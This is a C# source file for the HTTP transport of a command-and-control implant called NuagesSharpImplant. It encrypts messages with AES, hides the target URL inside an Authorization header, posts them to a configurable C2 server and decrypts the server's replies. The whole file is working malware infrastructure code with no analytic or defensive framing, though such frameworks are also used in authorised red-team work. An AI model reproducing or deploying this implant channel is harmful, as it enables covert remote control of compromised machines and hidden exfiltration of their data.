using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;


namespace NuagesSharpImplant
{
   
    public class HTTPAES256Connection : NuagesC2Connection
    {
        private string connectionString;

        private string handler = "PyAES256";

        private AESHelper aes;

        public int refreshrate;

        public int buffersize;

        public HTTPAES256Connection(string connectionString, string password, int buffersize, int refreshrate)
        {
            this.aes = new AESHelper(password);

            this.connectionString = connectionString;

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;
        }

        public string getConnectionString()
        {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }

        public void setRefreshRate(int refreshrate)
        {

            this.refreshrate = refreshrate;

        }

        public void setBufferSize(int buffersize)
        {

            this.buffersize = buffersize;

        }


        public string POST(string url, string jsonContent)
        {
            byte[] byteArray = this.aes.EncryptString(jsonContent);

            byte[] EncUrl = this.aes.EncryptString(url);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.connectionString);

            request.Method = "POST";

            UTF8Encoding encoding = new UTF8Encoding();

            request.Headers.Add("Authorization", Convert.ToBase64String(EncUrl, 0, EncUrl.Length));
            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/x-www-form-urlencoded";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    MemoryStream ms = new MemoryStream();
                    byte[] buffer = new byte[16384];
                    int bytesRead;
                    while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        ms.Write(buffer, 0, bytesRead);
                    }
                    byte[] bytes = ms.ToArray();
                    return this.aes.DecryptString(bytes);
                }
            }
        }
        class AESHelper
        {
            byte[] key;

            static byte[] Sha256(string rawData)
            {
                using (SHA256 sha256Hash = SHA256.Create())
                {
                    return sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

                }
            }

            public AESHelper(string password)
            {

                this.key = Sha256(password);

            }

            public byte[] EncryptString(string message)
            {
                byte[] encrypted;
                using (Rijndael rijAlg = Rijndael.Create()) {
                    rijAlg.Key = key;
                    rijAlg.GenerateIV();
                    rijAlg.Mode = CipherMode.CBC;
                    rijAlg.Padding = PaddingMode.PKCS7;
                    byte[] iv = rijAlg.IV;
                    ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        msEncrypt.Write(iv, 0, iv.Length);
                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        {
                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                            {
                                swEncrypt.Write(message);
                                swEncrypt.Flush();
                            }
                           encrypted = msEncrypt.ToArray();
                        }
                    }
                }
                return encrypted;
            }
                              

            public string DecryptString(byte[] bytes)
            {
                string plaintext = null;
                using (Rijndael rijAlg = Rijndael.Create())
                {
                    rijAlg.Key = key;
                    rijAlg.Mode = CipherMode.CBC;
                    rijAlg.Padding = PaddingMode.PKCS7;

                    using (MemoryStream msDecrypt = new MemoryStream(bytes))
                    {
                        var iv = new byte[16];
                        msDecrypt.Read(iv, 0, 16);
                        rijAlg.IV = iv;
                        ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
            }
        }
    }
}
